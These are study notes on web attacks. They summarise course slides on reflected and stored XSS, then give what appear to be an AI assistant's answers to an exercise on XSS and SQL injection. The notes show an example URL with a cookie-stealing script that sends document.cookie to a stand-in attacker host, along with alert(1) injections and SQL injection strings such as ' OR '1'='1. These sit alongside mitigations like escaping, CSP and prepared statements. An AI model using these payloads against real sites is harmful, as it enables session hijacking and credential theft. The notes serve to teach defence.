# Web Attacks: XSS (Cross Site Scripting)

## Definition and General Mechanism

*   **Definition**: XSS (Cross Site Scripting) consists of injecting arbitrary code (usually HTML/JavaScript) into a web application. This code is then executed in a user's web browser or any solution that interprets HTML code.
*   **Attack Technique**: It is a client-side attack technique. It leverages the victims' browser to execute malicious code.
*   **Target**: The attack does not directly target the website itself, but rather the internet users (internautes) who visit it.

## Fundamental Problem

The XSS attack is possible when a web server or web application:
1.  Does not validate data provided by visitors (e.g., URL, form content).
2.  Sends back this unfiltered text, provided by users, without having filtered it beforehand.

## Main Objective of the XSS Attack

*   **Identity Data Theft**: The main goal is to steal users' personal and identification information, such as:
    *   Cookies
    *   Session tokens
    *   Credit card numbers
    *   Other sensitive information.
*   **Importance of Cookies**: Cookies facilitate automatic login. Stealing cookies allows an attacker to log in as the victim. This ranks XSS among the riskiest attacks.

## Main Types of XSS

There are two main types of XSS attacks:

1.  **Reflected XSS (Non-Permanent)**
2.  **Stored XSS (Permanent)**

---

### 1. Reflected XSS (Non-Permanent)

*   **Characteristics**:
    *   Called "non-permanent" because the malicious code is **not saved** in a file or database on the server.
    *   Data sent by a client (e.g., via a URL parameter) is displayed as-is in the resulting page returned by the server.
*   **Attack Flow (based on slide 2)**:
    1.  The "Pirate" (attacker) crafts a malicious link containing the injected script (e.g., `https://banque.com/?search=<script>alert(1)</script>` or to steal cookies: `https://banque.com/?search=<script>var i = new Image; i.src="http://site-attacker.com"+document.cookie;</script>`).
    2.  The "Victime" (victim) clicks on this link.
    3.  The victim's browser sends the request to the "Site web ciblé" (targeted website, e.g., `https://banque.com`), including the injected code in the URL.
    4.  The web server processes the request and **reflects** the injected code in the HTML response sent to the victim's browser. The victim's browser then executes this code.
    5.  If the script is designed for it (e.g., cookie theft), it sends the stolen data to the attacker's server ("Envoi de données" - Data Sending).
*   **Demonstration (based on slide 4)**:
    *   **Normal behavior**: A search for `security` on `...web-security-academy.net/?search=security` displays "0 search results for 'security'".
    *   **Attack**: The URL is modified to `...web-security-academy.net/?search=<script>alert(1)</script>`.
    *   **Result**: The victim's browser executes the script, displaying an alert box with "1", which confirms the vulnerability. The page displays "0 search results for "" (as the script is the "search term"), but the important part is that the script was executed.

---

### 2. Stored XSS (Permanent)

*   **Characteristics**:
    *   Data containing the malicious script is provided from some data source (Database, files, etc.) and is displayed as-is in the resulting page **without being encoded into HTML entities**.
    *   The impact of Stored XSS is particularly severe because it affects **all visitors** to the compromised page.
*   **Attack Flow (based on slide 3)**:
    1.  The "Pirate" (attacker) injects malicious code into a vulnerable site (e.g., in a comment field by submitting `<script>alert(1)</script>`). This code is then **stored** by the website (e.g., in its database).
    2.  A "Victime" (victim) visits the compromised page that now contains the stored malicious code.
    3.  The victim's browser requests the page. The server retrieves the content, including the attacker's stored malicious code, and sends it to the victim.
    4.  The victim's browser displays the page and executes the malicious script included in it.
    5.  The script can then perform malicious actions, such as sending the victim's data to the attacker ("Envoi de données" - Data Sending).
*   **Demonstration (based on slide 5)**:
    *   An attacker (named "Me") posts a comment containing the script `<script>alert(1)</script>` on `...web-security-academy.net/post?postId=8`.
    *   This comment, including the script, is stored by the application.
    *   Later, when a user (like "Bud Vizer" or even "Me") views the page containing this comment, the stored script is retrieved and sent to their browser.
    *   **Result**: The browser executes the script, causing an alert box "1" to pop up for anyone viewing the comments. The DevTools screenshot confirms the presence of `<script>alert(1)</script>` in the HTML code of the comment section.

---

## In Summary

XSS attacks exploit a user's trust in a website by injecting malicious code that executes in their browser.
*   **Reflected XSS** requires the victim to click on a specially crafted link.
*   **Stored XSS** involves malicious code being saved on the server and affecting all visitors to the compromised page.
The root cause of these vulnerabilities is the web application's failure to properly validate and/or encode user-supplied data before displaying it.


---


Here is a detailed English answer to the questions in the image (from **Série N°4: Network Vulnerabilities - Exercise 1: CSS/XSS and SQL Injection**), formatted for your study notes:

---

# 🛡️ Network Vulnerabilities – Exercise 1: XSS and SQL Injection

---

## 1. What is an XSS (or CSS) attack?

> An **XSS (Cross-Site Scripting)** attack occurs when an attacker injects malicious scripts into trusted websites. These scripts are then executed in the browsers of unsuspecting users, potentially leading to session hijacking, credential theft, or content manipulation.  
> ⚠️ Note: **CSS** refers to _Cascading Style Sheets_ and is not a type of attack. The use of “CSS” in the exercise is a mistake — it should be **XSS**.

---

## 2. What precaution should be taken to avoid a cross-site scripting (XSS) attack?

To prevent XSS attacks, a developer should:

- **Sanitize and escape all user input** before rendering it in the browser.
    
- Use frameworks that **auto-escape HTML content** (e.g., React, Angular).
    
- Implement **Content Security Policy (CSP)** headers to block inline scripts.
    
- Avoid dangerous functions like `innerHTML`, `document.write()`, or `eval()` when inserting user input into the DOM.
    

---

## 3. What is an SQL Injection attack?

> An **SQL Injection** attack occurs when an attacker inserts or "injects" malicious SQL code into a query. This can manipulate the database into revealing, modifying, or deleting data, even without valid credentials.

Example:

```sql
SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'xyz'
```

Here, the `--` comments out the rest of the SQL, bypassing password verification.

---

## 4. What is the fundamental difference between Cross-Site Scripting (XSS) and SQL Injection?

|XSS|SQL Injection|
|---|---|
|Targets **users' browsers**|Targets **databases**|
|Injects **JavaScript** or HTML|Injects **SQL code**|
|Aims to steal data from the client side (cookies, sessions)|Aims to manipulate the server-side database|
|Happens in **client-side context**|Happens in **server-side context**|

---

## 5. Two methods a hacker could use to access the bank’s DB without valid login/password:

1. **SQL Injection** – by inserting malicious code such as:
    
    ```
    ' OR '1'='1
    ```
    
    The query becomes:
    
    ```sql
    SELECT nom, pw FROM database WHERE nom = '' OR '1'='1' AND password = ''
    ```
    
    This always evaluates to true and returns data without valid credentials.
    
2. **Brute Force Attack** – trying many username/password combinations until successful access is gained (often automated).
    

---

## 6. What should the site administrator do to solve this problem?

To secure the site against these vulnerabilities:

- Use **parameterized queries** or **prepared statements** to prevent SQL injection.
    
    ```php
    $stmt = $pdo->prepare("SELECT nom, pw FROM users WHERE nom = ? AND password = ?");
    $stmt->execute([$user, $password]);
    ```
    
- Validate and sanitize all user input.
    
- Enable **error handling** without revealing system internals.
    
- Apply **least privilege** access to database accounts.
    
- Use **security headers** and content sanitization to mitigate XSS.
    

---

Let me know if you want a Markdown file or a quiz version of this.